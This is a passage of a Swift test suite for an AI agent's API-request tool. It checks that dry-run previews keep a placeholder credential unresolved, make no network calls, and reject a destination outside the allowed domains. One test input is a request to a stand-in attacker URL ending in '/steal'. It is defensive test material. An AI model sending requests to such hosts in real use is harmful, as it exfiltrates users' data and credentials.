            let supervisor = try await OutboundEgressSupervisor.make(policyStore: store)
            let counter = WireAttemptCounter()
            let tool = ApiRequestTool(
                transport: RecordingTransport(counter: counter),
                egressSupervisor: supervisor
            )

            // The credential has no stored value, so a preview that resolved it
            // would fail; keeping the reference proves resolution was skipped.
            let preview = try await tool.execute(
                input: ToolInput(
                    toolName: "api.request",
                    argumentsJSON: #"{"method":"GET","url":"https://api.example.com/data","headers":{"Authorization":"Bearer rwsecret:API_KEY"}}"#
                ),
                context: ToolContext(conversationID: UUID(), dryRun: true)
            )
            #expect(!preview.isError)
            #expect(preview.content.contains("rwsecret:API_KEY"))
            #expect(counter.value == 0)

            // A denied destination fails the preview too, so the approval card
            // never advertises a target the live call would refuse.
            let deniedPreview = try await tool.execute(
                input: ToolInput(
                    toolName: "api.request",
                    argumentsJSON: #"{"method":"GET","url":"https://evil.example.net/steal"}"#
                ),
                context: ToolContext(conversationID: UUID(), dryRun: true)
            )
            #expect(deniedPreview.isError)
            #expect(deniedPreview.content.contains("not in the allowed domains"))
            #expect(counter.value == 0)
        }
    }
}
